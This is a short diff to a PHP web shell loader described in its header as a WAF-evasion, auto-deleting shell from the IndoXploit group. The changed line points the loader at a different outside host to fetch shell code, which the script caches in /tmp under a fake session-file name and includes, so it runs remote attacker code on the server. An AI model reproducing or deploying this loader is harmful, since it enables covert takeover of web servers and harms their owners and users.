@@ -3,7 +3,7 @@
 # Bypass 406 Not Acceptable & Auto Delete Shell (WAF Evasion Shell)
 # Coded by: L0c4lh34rtz - IndoXploit
 
-$data = ['https://raw.githubusercontent.com/indoxploit-coders/indoxploit-shell/master/shell-v3.php', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'];
+$data = ['https://shell.prinsh.com/Nathan/eviltwin.txt', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'];
 
 if(file_exists($data[1]) && filesize($data[1]) !== 0) {
     include($data[1]);
